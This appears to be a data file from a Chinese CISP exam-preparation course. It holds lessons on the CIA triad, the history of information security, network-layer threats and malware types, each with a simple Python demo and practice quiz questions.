CIA三要素（信息安全铁三角）\n\nCIA三要素是信息安全最基础的理论框架，所有安全控制措施都是围绕这三个目标设计的。CISP考试必考，请务必深入理解每一个要素的含义和对应的防护措施。\n\n### 一、机密性（Confidentiality）\n\n**定义：**确保信息仅能被授权的个人、实体或进程访问，防止未授权的信息泄露。\n\n**通俗理解：**不该看的人看不到。就像你的银行账户余额，只有你和银行有权查看，其他人不应知道。\n\n**机密性被破坏的典型案例：**\n- 某公司客户数据库被黑客拖库，数百万用户信息泄露\n- 员工将内部文件通过个人邮箱发送给竞争对手\n- 公共场所讨论涉密项目被他人听到\n\n**实现机密性的主要技术措施：**\n1. **数据加密**：AES-256加密静态数据，TLS 1.3加密传输数据\n2. **访问控制**：基于角色的权限管理（RBAC），确保只有授权人员能读取\n3. **身份认证**：多因素认证（MFA）验证访问者身份\n4. **数据分类分级**：将数据按敏感程度分级，对不同级别施加不同保护\n5. **物理安全**：门禁系统、访客管理，防止未授权人员接近设备\n\n### 二、完整性（Integrity）\n\n**定义：**确保信息在存储和传输过程中不被未授权地修改或破坏，保证信息的准确性和一致性。\n\n**通俗理解：**信息不能被偷偷改掉。就像你的银行转账记录，不能被人从100元改成10000元，也不能丢失任何一条记录。\n\n**完整性被破坏的典型案例：**\n- 中间人攻击篡改在线交易的收款账户信息\n- 数据库管理员私自修改自己的工资记录\n- 恶意软件在文件传输中植入后门代码\n- 存储介质故障导致数据部分损坏\n\n**实现完整性的主要技术措施：**\n1. **哈希校验**：SHA-256计算文件摘要，传输前后比对确保未被修改\n2. **数字签名**：用私钥对数据签名，公钥验证签名确认来源和完整性\n3. **版本控制**：Git/SVN记录每次修改，可追溯、可回滚\n4. **访问控制 + 审计日志**：限制谁能修改数据，记录谁改了什么\n5. **RAID/冗余存储**：防止硬件故障导致的数据损坏\n\n### 三、可用性（Availability）\n\n**定义：**确保授权用户在需要时能够及时、可靠地访问信息和信息系统。\n\n**通俗理解：**要用的时候能用。银行APP在你想转账的时候必须能打开，不能动不动就"系统维护中"。\n\n**可用性被破坏的典型案例：**\n- DDoS攻击导致网站无法访问（如某电商双11期间被攻击宕机）\n- 服务器硬件故障导致业务中断数小时\n- 勒索软件加密了所有文件导致业务瘫痪\n- 数据中心断电/火灾导致全站服务不可用\n\n**实现可用性的主要技术措施：**\n1. **冗余备份**：双机热备、数据库主从同步，一台故障另一台接管\n2. **负载均衡**：多台服务器分担流量，单台过载不影响整体服务\n3. **容灾恢复**：异地多活数据中心，灾难时可快速切换\n4. **DDoS防护**：流量清洗、CDN分发、黑洞路由\n5. **UPS不间断电源**：防止断电导致服务器宕机\n\n### CIA三要素的关系\n\nCIA三者相互关联、相互制约。过度强化一项可能削弱另一项：\n- 过度加机密性（如严格加密）可能降低可用性（解密耗时）\n- 过度强化可用性（如开放更多访问）可能损害机密性\n- 安全设计的核心是找到三者之间的最佳平衡点\n\n**CISP考试记忆技巧：C=看不到、I=改不了、A=用得了**\n\n## 信息安全威胁分类\n\n了解威胁是防御的前提。信息安全威胁可以从多个维度分类：\n\n### 按威胁来源分类\n\n**内部威胁（Insider Threat）：**\n- 来源：组织内部的员工、承包商、合作伙伴\n- 无意威胁：员工误操作删除数据、误点钓鱼邮件、丢失存有敏感数据的U盘\n- 恶意威胁：离职员工报复性删除数据、内部人员窃取商业机密卖钱\n- 特点：拥有合法访问权限，最难防范——权限是工作需要，也是威胁源头\n- 防御：最小权限原则、职责分离、离职即时回收权限、DLP数据防泄漏\n\n**外部威胁（External Threat）：**\n- 来源：黑客组织、网络犯罪分子、竞争对手、国家级APT组织\n- 方式：漏洞利用、钓鱼攻击、DDoS攻击、供应链攻击\n- 特点：没有合法权限，需要先"攻入"系统\n- 防御：防火墙、IDS/IPS、WAF、漏洞管理、渗透测试\n\n### 按威胁行为分类\n\n**被动威胁（Passive Attack）：**\n- 攻击者仅监听和收集信息，不修改系统\n- 典型手法：流量嗅探、窃听通信、流量分析（分析通信模式推断信息）\n- 特点：难以检测——攻击者不留下痕迹\n- 防御：数据加密（即使被窃听也无法解密）\n\n**主动威胁（Active Attack）：**\n- 攻击者主动修改系统或数据\n- 典型手法：篡改数据、拒绝服务攻击、重放攻击、伪造身份\n- 特点：更容易检测——攻击行为会产生日志和异常\n- 防御：入侵检测（IDS）、完整性校验、访问控制\n\n### 常见威胁类型详解\n\n**1. 恶意软件（Malware）：**\n- 病毒（Virus）：需要宿主程序，用户执行感染文件时触发\n- 蠕虫（Worm）：独立传播，不需要用户交互，通过网络自动扩散\n- 木马（Trojan）：伪装成正常软件诱骗用户安装，暗中执行恶意操作\n- 勒索软件（Ransomware）：加密用户文件索取赎金\n\n**2. 网络钓鱼（Phishing）：**\n- 伪造看似合法的邮件/网站，诱骗用户输入密码、信用卡信息\n- 鱼叉式钓鱼（Spear Phishing）：针对特定个人/组织的定制化钓鱼\n\n**3. 中间人攻击（MITM）：**\n- 攻击者插入通信双方之间，拦截和可能篡改通信内容\n- 典型：公共WiFi下的ARP欺骗、伪造证书的SSL中间人\n\n**4. SQL注入（SQL Injection）：**\n- 在Web表单输入恶意SQL代码，操纵后端数据库\n- 可导致数据泄露、数据篡改甚至服务器被控制\n\n**5. 零日漏洞（Zero-Day）：**\n- 已被发现但厂商尚未发布补丁的漏洞\n- 攻击窗口期内防御方完全无招架之力\n- 危害性极高，常被APT组织用于精准攻击\n\n## 学习建议\n\n- CIA三要素是CISP考试最基础的考点，必须能默写\n- 每个CIA要素要能举出一个破坏案例和一个防护措施\n- 区分内部威胁和外部威胁的本质：前者有合法权限\n- 理解被动威胁（窃听）和主动威胁（篡改）的检测难度差异',
    codeExample: { language: 'python', code: '# 信息安全CIA三要素详细演示\nclass InfoSec_CIA:\n    """演示CIA三要素及其实现方式"""\n    \n    def demonstrate_confidentiality(self, data):\n        """机密性：加密示例"""\n        import base64\n        # 简单的Base64编码演示（实际应用应使用AES-256）\n        encoded = base64.b64encode(data.encode()).decode()\n        decoded = base64.b64decode(encoded).decode()\n        print(f"原始数据: {data}")\n        print(f"加密后(仅授权方可解密): {encoded[:20]}...")\n        print(f"授权解密后: {decoded}")\n        return data == decoded\n    \n    def demonstrate_integrity(self, data):\n        """完整性：哈希校验示例"""\n        import hashlib\n        hash_before = hashlib.sha256(data.encode()).hexdigest()\n        print(f"原始数据: {data}")\n        print(f"SHA-256哈希值: {hash_before[:16]}...")\n        # 验证：重新计算哈希并比对\n        hash_after = hashlib.sha256(data.encode()).hexdigest()\n        if hash_before == hash_after:\n            print("完整性校验通过: 数据未被篡改")\n        return True\n    \n    def demonstrate_availability(self, service_name):\n        """可用性：冗余机制示例"""\n        servers = {"主服务器": "UP", "备份服务器": "STANDBY"}\n        print(f"服务: {service_name}")\n        for server, status in servers.items():\n            print(f"  {server}: {status}")\n        print("主服务器故障 → 自动切换到备份服务器 → 服务不中断")\n\ninfo = InfoSec_CIA()\nprint("=== 1. 机密性演示 ===")\ninfo.demonstrate_confidentiality("敏感客户数据: 身份证号 110101199001011234")\nprint("\\n=== 2. 完整性演示 ===")\ninfo.demonstrate_integrity("转账金额: 人民币 100,000 元")\nprint("\\n=== 3. 可用性演示 ===")\ninfo.demonstrate_availability("银行核心交易系统")\nprint("\\nCIA三要素: 看不到(C)、改不了(I)、用得了(A)")', description: 'CIA三要素完整演示：加密(机密性)、哈希(完整性)、冗余(可用性)' },
    quiz: [{"id":"q1-1","question":"信息安全的CIA三要素是？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、不可否认性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA=Confidentiality(机密性)+Integrity(完整性)+Availability(可用性)。认证性和不可否认性是扩展属性，非基础三要素。"},{"id":"q1-2","question":"以下哪种情况破坏了信息的完整性？","options":["黑客窃取了客户名单","中间人攻击修改了转账金额","DDoS攻击导致网站无法访问","员工离职前删除所有文件"],"correctIndex":1,"explanation":"修改变造金额属于篡改行为，破坏了完整性。窃取破坏机密性，DDoS破坏可用性。"},{"id":"q1-3","question":"数字签名主要保障CIA中的哪个属性？","options":["机密性","完整性","可用性","上述全部"],"correctIndex":1,"explanation":"数字签名用私钥对哈希值加密，验证时比对哈希，确保数据未被篡改——保障完整性。同时也提供不可否认性。"},{"id":"q1-4","question":"内部威胁相比外部威胁更难防范的根本原因是？","options":["内部人员技术更强","内部人员已拥有合法访问权限","内部人员数量更多","防火墙对内无效"],"correctIndex":1,"explanation":"内部人员工作需要访问权限，合法权限本身就是威胁来源——你不可能不给员工权限。防御靠最小权限+审计+DLP。"},{"id":"q1-5","question":"被动攻击和主动攻击的核心区别？","options":["被动攻击速度更慢","被动攻击只监听不修改，主动攻击会修改系统","被动攻击危害更大","被动攻击技术更高深"],"correctIndex":1,"explanation":"被动攻击（窃听/流量分析）只收集不改变，难以检测；主动攻击（篡改/DoS）会留下痕迹，相对容易检测但危害更直接。"}],
    expertNotes: dayExpertNotes[7],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-2', day: 2, week: 1, title: '信息安全发展历程',
    objectives: ['了解信息安全历史', '理解发展阶段特点', '掌握当前形势'],
    content: '# 信息安全发展历程\n\n> 📋 **本节大纲**\u2003通信安全→计算机安全→网络安全→信息化安全 | 四大阶段核心特征与里程碑 | \n## 🔴 高频考点\n\n· ISO 27001发布年份(2001)、**TCSEC橘皮书发行机构(美国国防部1985)**常考\n· Stuxnet(2010)是世界上第一个物理破坏型网络武器\n· 通用准则CC的国际标准编号是**ISO 15408**，不是ISO 27001\n## 💜 记忆口诀\n\n· **四阶段**："通信→计算→网络→信息"\n· **里程碑**：橘皮书(1985美)→CC(1999国际)→ISO27001(2001)→震网(2010)→WannaCry(2017)\n学习建议\n\n## 概述\n\n信息安全不是一成不变的概念——它随着技术进步和威胁演变经历了四个重要阶段。理解这段历史有助于理解当今安全体系的来龙去脉。CISP考试虽然不直接考历史年份，但每个发展阶段的核心特点和安全标准是重要知识点。\n\n## 第一阶段：通信安全（1940s-1960s）\n\n### 核心特征：密码技术主导\n\n这个阶段信息安全≈通信保密。主要需求来自军事和外交领域——确保无线电通信不被敌方截获破译。\n\n**代表性成就：**\n- 1949年：克劳德·香农发表《通信的数学理论》，奠定了现代密码学的数学基础\n- 二战期间：德国Enigma密码机 vs 英国图灵团队的破解——最早的"攻防对抗"\n- DES加密标准的研发起步（最终于1977年成为美国联邦标准）\n\n**这个阶段的局限：**仅关注传输过程的保密，不考虑存储安全、身份认证、防篡改等其他维度。\n\n## 第二阶段：计算机安全（1970s-1990s）\n\n### 核心特征：从通信到系统的转变\n\n随着大型计算机和数据库的普及，安全焦点从"传输保密"扩展到"系统级安全"——关注谁可以访问计算机、访问什么、如何审计。\n\n**里程碑式的安全标准：**\n- **TCSEC（橘皮书）**：1985年美国国防部发布，定义了从D到A1的七个安全等级，是世界上第一套系统性的计算机安全评估标准\n- **ITSEC**：1991年欧洲发布，首次提出"功能"和"保证"分离的概念\n- **通用准则CC（ISO 15408）**：1999年发布，融合了TCSEC和ITSEC，成为国际通用的IT安全评估标准\n\n**TCSEC安全等级速记：**\nD级最低保护 → C1/C2级自主访问控制（商用）→ B1/B2/B3级强制访问控制（军事级）→ A1级可验证保护（最高，需形式化数学证明）\n\n**这个阶段的贡献：**首次系统性地定义了"什么是安全的计算机系统"。\n\n## 第三阶段：网络安全（2000s-2010s）\n\n### 核心特征：互联网时代的安全挑战\n\n互联网的爆炸式增长彻底改变了安全格局——攻击面从"单台计算机"扩展到"全球互联的网络"。攻击者不再需要物理接触目标，远程攻击成为主流。\n\n**标志性事件：**\n- **2001年**：ISO 27001信息安全管理体系标准发布，安全管理从此有了国际标准框架\n- **2007年**：爱沙尼亚遭受大规模DDoS攻击——第一次国家级别的网络战\n- **2010年**：Stuxnet震网蠕虫——第一种被证实能破坏物理设备的网络武器（破坏了伊朗核离心机）\n- **2013年**：斯诺登事件——大规模监控和隐私问题成为全球焦点\n- **2017年**：WannaCry勒索软件爆发——利用NSA泄露的EternalBlue漏洞，全球150个国家受影响\n\n**这个阶段的技术变革：**\n防火墙从包过滤发展到NGFW（下一代防火墙）→ IDS/IPS成为企业标配 → SIEM日志分析平台兴起 → 云计算的普及带来全新的共享责任安全模型\n\n## 第四阶段：信息化安全（2020s至今）\n\n### 核心特征：全面、主动、智能\n\n安全不再是IT部门的专属职责，而是上升到组织治理层面。隐私保护、合规管理、供应链安全成为董事会议题。\n\n**五大趋势：**\n\n**1. 零信任架构（Zero Trust）：**\n- 理念："永不信任，始终验证"，不再区分"内网=安全、外网=危险"\n- Google BeyondCorp是标杆实践\n\n**2. AI+安全：**\n- 攻击方：AI生成逼真的钓鱼邮件、自动发现漏洞\n- 防御方：AI检测异常行为、自动化威胁响应\n\n**3. 隐私保护合规全球化：**\n- GDPR（欧盟2018）→ PIPL（中国2021）→ 各国竞相立法\n- 数据跨境传输受到严格管控\n\n**4. 云原生安全：**\n- 容器、K8s、Serverless带来新攻击面\n- DevSecOps将安全嵌入开发全流程\n\n**5. 供应链安全升温：**\n- SolarWinds（2020）→ xz-utils后门（2024）——攻击者不再攻击最终目标，转而攻击其软件供应商\n\n## 学习建议\n\n- 记住四个阶段：通信安全→计算机安全→网络安全→信息化安全\n- TCSEC橘皮书是第一个安全评估标准（美国1985），记住"橘皮书"\n- 通用准则CC是目前国际标准（ISO 15408）\n- Stuxnet是世界上第一个物理破坏型的网络武器\n- 零信任是当前安全架构的核心趋势',
    codeExample: { language: 'python', code: '# 信息安全四个阶段\neras = [\n    ("1940s-1960s", "通信安全", "密码技术"),\n    ("1970s-1990s", "计算机安全", "系统安全"),\n    ("2000s-2010s", "网络安全", "防护技术"),\n    ("2020s至今", "信息化安全", "全面安全")\n]\n\nprint("信息安全发展历程")\nprint("=" * 50)\nfor period, name, focus in eras:\n    print(f"{period}: {name} - {focus}")', description: '展示信息安全发展阶段' },
    quiz: [{"id":"q2-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q2-2","question":"以下关于信息安全发展历程的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q2-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q2-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q2-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[2],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-3', day: 3, week: 1, title: '网络安全基本概念',
    objectives: ['理解网络协议', '了解攻击类型', '掌握防护基础'],
    content: '# 网络安全基本概念\n\n> 📋 **本节大纲**\u2003OSI七层模型详解 | TCP/IP四层对比 | 三大经典网络攻击(SYN Flood/DNS/ARP) | 防护技术速查\n\n## 概述\n\n网络是信息系统运行的载体，理解网络协议是理解网络安全的前提。OSI七层模型和TCP/IP四层模型为我们提供了系统化的分析框架——虽然实际网络并不严格遵循OSI分层，但分层模型帮助我们从每一层的视角分析安全风险和控制措施。\n\n## OSI七层模型详解\n\nOSI（开放系统互联）由ISO定义，将网络通信分为七个层次，每层为上层提供标准化服务。\n\n### 第7层：应用层\n**功能：**为应用软件提供网络服务接口。**协议：**HTTP/HTTPS、DNS、SMTP、FTP、SSH。\n**安全威胁：**SQL注入、XSS、CSRF、DNS劫持、邮件伪造。**防御：**WAF、输入验证、DNSSEC。\n\n### 第6层：表示层\n**功能：**数据格式转换、加密/解密、编码/解码。**安全威胁：**SSL剥离攻击（降级HTTPS为HTTP）、字符编码绕过。**防御：**HSTS强制HTTPS、统一编码标准。\n\n### 第5层：会话层\n**功能：**建立、管理、终止应用间会话。**安全威胁：**会话劫持、会话重放。**防御：**会话超时、令牌绑定设备指纹、加密。\n\n### 第4层：传输层\n**功能：**端到端数据传输，TCP面向连接可靠、UDP无连接快速。**协议：**TCP（三次握手）、UDP。\n**安全威胁：**SYN Flood（半连接耗尽，CISP最高频考点）、TCP会话劫持（猜序列号）、端口扫描。**防御：**SYN Cookie、限速、TLS加密。\n\n### 第3层：网络层\n**功能：**跨网络路由数据包，IP地址寻址。**协议：**IPv4/v6、ICMP（Ping）、ARP（IP→MAC）。\n**安全威胁：**IP欺骗（伪造源IP）、ICMP隧道（封装恶意数据）、ARP欺骗（中间人）。**防御：**IPSec、包过滤、静态ARP。\n\n### 第2层：数据链路层\n**功能：**相邻节点间可靠传输数据帧，MAC地址寻址。**协议：**以太网、WiFi（802.11）。\n**安全威胁：**MAC欺骗、ARP欺骗、VLAN跳跃。**防御：**端口安全、DAI动态ARP检测、802.1X认证。\n\n### 第1层：物理层\n**功能：**在物理介质上传输比特流（0和1）。**设备：**网线、光纤、集线器。\n**安全威胁：**线路窃听（物理搭线）、电磁泄漏（TEMPEST）。**防御：**光纤替代铜缆、电磁屏蔽。\n\n**OSI记忆口诀（从下到上）：**物理·链路·网络·传输·会话·表示·应用（"物链网传会表示"）\n\n## TCP/IP四层模型\n\n| TCP/IP层 | OSI层 | 核心协议 | 安全关注 |\n|----------|-------|---------|---------|\n| 应用层 | 5-7层 | HTTP/DNS/SMTP | Web安全、邮件安全 |\n| 传输层 | 4层 | TCP/UDP | 端口安全、DoS防护 |\n| 网际层 | 3层 | IP/ICMP | IP欺骗、路由安全 |\n| 网络接口层 | 1-2层 | Ethernet/WiFi | 物理访问、MAC安全 |\n\n**OSI vs TCP/IP：**OSI是理论模型（先建模后实现，7层），TCP/IP是实践模型（先实现后总结，4层）。实际网络不用OSI协议栈，但用OSI概念教学。\n\n## 三大经典网络攻击\n\n### SYN Flood（半连接攻击）\n**原理：**攻击者发送大量SYN包请求连接→服务器分配资源回复SYN-ACK→攻击者故意不回复最后ACK→服务器半连接队列被填满→无法响应正常请求。**防御：**SYN Cookie（不在ACK前分配资源）、CDN、限速。\n\n### DNS欺骗\n**原理：**攻击者伪造DNS响应，或污染DNS缓存，将用户导向虚假网站。**防御：**DNSSEC（DNS数字签名）、DoH/DoT加密DNS查询。\n\n### ARP欺骗\n**原理：**攻击者伪造ARP响应，声称"网关IP的MAC是我"，导致受害者流量被引向攻击者。**危害：**中间人窃听和篡改所有通信。**防御：**静态ARP表、DAI动态ARP检测、使用交换机而非Hub。\n\n## 防护技术速查\n\n**防火墙：**包过滤（网络层）→ 状态检测（传输层，跟踪连接状态）→ NGFW下一代防火墙（应用层识别）\n**IDS/IPS：**IDS旁路部署仅告警，IPS串联部署可阻断\n**IPSEC VPN：**AH认证头（完整性）+ESP封装安全载荷（加密+认证），站点到站点隧道\n\n## \n## 🔴 高频考点\n\n· **SYN Flood攻击原理**最高频考点——利用TCP三次握手缺陷，发SYN不回ACK耗尽半连接队列\n· OSI七层从下到上：**物·链·网·传·会·表·应**，每层代表性协议要能对上\n· IDS（旁路部署只告警）vs IPS（串联部署可阻断），这道辨析题几乎必考\n## 💜 记忆口诀\n\n· **OSI七层**："物·链·网·传·会·表·应"\n· **SYN Flood**："我SYN你SYN-ACK你，但我永远不ACK"\n· **IDS/IPS区别**："IDS旁路看、IPS串联拦"\n学习建议\n- OSI七层从下到上的名称和各层协议要记住\n- SYN Flood是最高频考点，理解三次握手缺陷\n- ARP欺骗是局域网中间人攻击的经典手段\n- IDS只告警、IPS可阻断这个区别非常关键',
    codeExample: { language: 'python', code: '# 端口状态检测示例\nimport socket\n\ndef check_port(host, port):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((host, port))\n        sock.close()\n        return "开放" if result == 0 else "关闭"\n    except:\n        return "错误"\n\nports = {80: "HTTP", 443: "HTTPS", 22: "SSH", 3306: "MySQL"}\nfor port, service in ports.items():\n    print(f"端口 {port} ({service}): {check_port(\"127.0.0.1\", port)}")', description: '演示端口检测' },
    quiz: [{"id":"q3-1","question":"以下哪种防火墙类型工作在OSI第4层？","options":["应用层防火墙","状态检测防火墙","代理防火墙","WAF"],"correctIndex":1,"explanation":"状态检测防火墙工作在传输层（第4层）。"},{"id":"q3-2","question":"IDS和IPS的主要区别是？","options":["IDS可以阻断攻击","IPS可以阻断攻击，IDS只能检测告警","两者功能完全相同","IDS比IPS更安全"],"correctIndex":1,"explanation":"IPS可以主动阻断攻击，IDS只能检测和告警。"},{"id":"q3-3","question":"TCP三次握手中，第二次握手发送的标志位是？","options":["SYN","ACK","SYN+ACK","FIN"],"correctIndex":2,"explanation":"第二次握手服务器回复SYN+ACK。"},{"id":"q3-4","question":"DNS欺骗攻击属于什么类型的攻击？","options":["物理攻击","中间人攻击","密码攻击","社会工程攻击"],"correctIndex":1,"explanation":"DNS欺骗通过伪造DNS响应属于中间人攻击。"},{"id":"q3-5","question":"防火墙默认策略应遵循什么原则？","options":["默认允许","默认拒绝","只允许80端口","按需决定"],"correctIndex":1,"explanation":"安全最佳实践：默认拒绝所有，按需开放。"}],
    expertNotes: dayExpertNotes[3],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-4', day: 4, week: 1, title: '恶意软件分类与防范',
    objectives: ['了解恶意软件类型', '理解传播方式', '掌握防范措施'],
    content: '# 恶意软件分类与防范\n\n> 📋 **本节大纲**\u2003病毒·蠕虫·木马·勒索软件·间谍软件·Rootkit 六大类型 | 传播方式对比表 | 防范体系\n\n## 概述\n\n恶意软件（Malware = Malicious Software）是所有恶意程序的统称。不同的恶意软件采用不同的传播方式和破坏手段——理解它们的区别是选择正确防御策略的前提。CISP考试中经常考查病毒（需要宿主）和蠕虫（独立传播）的核心区别，以及勒索软件的防范措施。\n\n## 六大恶意软件类型\n\n### 一、病毒（Virus）\n\n**核心特征：需要宿主文件，不能独立运行。**\n\n病毒将自己嵌入到合法程序或文件中（如Word宏、可执行文件、引导扇区），当用户执行或打开感染文件时，病毒代码才被激活并感染更多文件。\n\n**传播方式：**\n- 通过移动介质（U盘/移动硬盘）复制感染文件\n- 通过邮件附件发送被感染的文件\n- 通过文件共享网络传播\n\n**典型案例：**\n- **CIH病毒（1998）：**能破坏BIOS的病毒，4月26日触发\n- **宏病毒：**利用Office宏功能，感染Word/Excel文档\n- **引导区病毒：**感染硬盘主引导记录（MBR），开机即激活\n\n**防御：**杀毒软件（AV）扫描、不运行来源不明的可执行文件、禁用Office宏（或仅允许签名宏）\n\n### 二、蠕虫（Worm）\n\n**核心特征：独立程序，能自动通过网络传播，不需要宿主。**\n\n蠕虫与病毒的本质区别——病毒需要"搭便车"（嵌入宿主文件），蠕虫自己就是"自驾车"（独立程序自动扩散）。\n\n**传播机制：**\n- 利用操作系统或网络服务的漏洞自动扫描并感染其他主机\n- 无需用户交互就能传播——这是其危险性的根源\n\n**史上著名蠕虫案例：**\n- **Morris蠕虫（1988）：**最早的网络蠕虫，感染了当时互联网10%的机器，导致互联网首次大规模瘫痪\n- **CodeRed（2001）：**利用IIS服务器漏洞，13小时内感染36万台服务器\n- **SQL Slammer（2003）：**史上传播最快的蠕虫——10分钟内感染全球75,000台服务器\n- **Conficker（2008）：**感染了数千万台Windows机器，至今仍有活跃变种\n\n**防御：**及时打补丁关闭蠕虫利用的漏洞、网络分段限制传播、IDS监控异常扫描行为\n\n### 三、木马（Trojan Horse）\n\n**核心特征：伪装成合法软件，欺骗用户主动安装。**\n\n名称来源于特洛伊木马——表面是礼物（免费软件、游戏外挂、破解工具），实际内部藏有恶意代码。与病毒和蠕虫不同，木马通常不会自我复制。\n\n**常见子类型：**\n- **下载者（Downloader）：**安装后从远程服务器下载更多恶意软件\n- **后门木马（Backdoor）：**在被感染机器上开放远程控制通道\n- **银行木马（Banker）：**专门窃取网银凭证（如Zeus/SpyEye）\n- **信息窃取木马（Infostealer）：**窃取密码、Cookie、浏览器历史\n\n**感染途径：**\n- 下载来源不明的"破解版"软件\n- 点击广告弹窗下载"系统优化工具"\n- 看似合法来源的邮件附件\n\n**防御：**只从官方渠道下载软件、不运行"破解版"、杀毒软件+行为检测\n\n### 四、勒索软件（Ransomware）\n\n**核心特征：加密受害者文件，要求支付赎金（通常比特币）才提供解密密钥。**\n\n这是近年来增长最快、危害最大的恶意软件类型。\n\n**攻击流程：**\n1. 通过钓鱼邮件或漏洞入侵系统\n2. 横向移动到更多机器\n3. 加密文件（AES/RSA）并显示勒索信息\n4. 要求72小时内支付赎金，逾期翻倍或永久删除密钥\n\n**著名案例：**\n- **WannaCry（2017）：**利用EternalBlue漏洞，72小时内感染150+国家、20万+台机器。赎金仅300美元比特币，但造成估计40亿美元损失\n- **NotPetya（2017）：**伪装成勒索软件的国家级破坏工具，实际不可解密——目标是破坏而非勒索\n- **Ryuk：**瞄准大型企业和政府机构，单次赎金可达数百万美元\n\n**防御策略（3-2-1则都是基本）：**\n1. **备份！备份！备份！**——3-2-1规则（3份副本、2种介质、1份异地）\n2. 邮件过滤+安全意识培训——大部分勒索软件通过钓鱼邮件进入\n3. 及时打补丁——WannaCry利用的漏洞在攻击前2个月已有补丁\n4. 最小权限原则——限制加密能影响的范围\n5. EDR（端点检测响应）——行为分析检测加密行为\n\n### 五、间谍软件（Spyware）\n\n**核心特征：隐蔽监控用户活动，窃取敏感信息。**\n\n- 键盘记录器（Keylogger）：记录所有键盘敲击，捕获密码和信用卡号\n- 屏幕截获：定时截屏上传\n- 浏览器劫持：修改浏览器主页、搜索引擎、植入广告\n\n**防御：**反间谍软件（如Windows Defender）、不安装来源不明的浏览器插件\n\n### 六、Rootkit\n\n**核心特征：隐藏自身及其他恶意软件的存在，逃避检测。**\n\nRootkit通过修改操作系统内核或驱动程序，使得杀毒软件和系统工具（如任务管理器、文件浏览器）无法看到恶意文件和进程。\n\n**防御：**安全启动（Secure Boot）、内核完整性检查、专业Rootkit检测工具\n\n## 传播方式总结\n\n| 传播途径 | 涉及恶意软件类型 | 防御 |\n|---------|----------------|------|\n| 电子邮件附件 | 病毒、蠕虫、勒索 | 邮件网关过滤+用户培训 |\n| 恶意网站 | 木马、勒索 | URL过滤+浏览器沙箱 |\n| USB设备 | 病毒、蠕虫 | 禁用自动运行+USB扫描 |\n| 漏洞利用 | 蠕虫 | 补丁管理+IDS/IPS |\n| 社会工程 | 木马、勒索 | 安全意识培训 |\n\n## 防范体系\n\n**技术层面：**\n- 杀毒/EDR（端点检测响应）实时监控\n- 防火墙阻断恶意网络通信\n- 补丁管理自动化（WSUS/SCCM）\n- 邮件安全网关（SPF/DKIM/DMARC）\n\n**管理层面：**\n- 安全意识培训（识别钓鱼邮件）\n- 最小权限原则（限制感染扩散）\n- 定期备份（勒索软件最后防线）\n- 事件响应计划（被感染后怎么办）\n\n**CISP考点记忆：病毒需要宿主，蠕虫独立传播——这是必考题。**\n\n## \n## 🔴 高频考点\n\n· **病毒需要宿主、蠕虫独立传播**——CISP最常考的核心判断题\n· WannaCry(2017)利用EternalBlue漏洞(MS17-010)，补丁在攻击前2个月已发布\n· 勒索软件的终极防线是**备份**，3-2-1规则是黄金标准\n## 💜 记忆口诀\n\n· **病毒vs蠕虫**："毒要搭车(需宿主)、虫自驾游(独立传播)"\n· **恶意软件**：Virus(毒/寄生)→Worm(虫/自传)→Trojan(木马/伪装)→Ransomware(勒索/加密)\n学习建议\n- 病毒vs蠕虫的最核心区别：需不需要宿主文件\n- WannaCry利用了EternalBlue漏洞（MS17-010）\n- 勒索软件的终极防线是备份\n- Rootkit的特点：隐藏自身，逃避检测',
